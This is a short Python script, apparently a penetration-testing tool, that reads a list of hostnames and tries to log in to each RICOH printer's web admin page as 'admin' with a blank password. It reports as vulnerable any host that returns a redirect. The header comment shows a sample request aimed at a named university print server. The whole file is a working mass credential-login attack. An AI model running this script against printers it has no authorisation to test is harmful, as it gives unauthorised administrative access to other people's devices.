#!/usr/bin/python3
import requests 
import argparse
import os
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
#Script to test RICOH printers for default admin BLANK credentials. Request should look like the below:
#
#POST /web/guest/en/websys/webArch/login.cgi HTTP/1.1
#Host: prisd03.print.flinders.edu.au
#Referer: https://prisd03.print.flinders.edu.au/web/guest/en/websys/webArch/authForm.cgi
#Connection: close
#Content-Length: 27
#userid=YWRtaW4%3D&password=
#
#userid is admin but the login page does a base64 encoding before sending it for authentication
#302: succesful login (you get redirected to another page)
#200: failed

parser = argparse.ArgumentParser()
parser.add_argument('-f','--file', help='File with hostnames to target', required=True)
parser.add_argument('-p','--proxy', help='Flag to set if we want to use a local proxy, such as BURP to send the request through', required=False)
args = parser.parse_args()

if args.proxy is not None:
    #To have BURP see the request
    proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


with open(args.file, "r") as f:
    for word in f:
        target = "https://" + word.strip() + "/web/guest/en/websys/webArch/login.cgi"
        treferer = "https://" + word.strip() + "/web/guest/en/websys/webArch/authForm.cgi"
        print("Target is %s" % target)
        
        if args.proxy is not None:
            r = requests.post(url=target, data={'userid':'YWRtaW4=','password':''}, headers={'Referer':treferer},proxies=proxies, verify=False,allow_redirects=False) 
        else:
            r = requests.post(url=target, data={'userid':'YWRtaW4=','password':''}, headers={'Referer':treferer}, verify=False,allow_redirects=False) 
        
        scode = r.status_code
        if scode == 302:
            print("Target is vulnerable")
        else:
            print("target is not vulnerable")
        
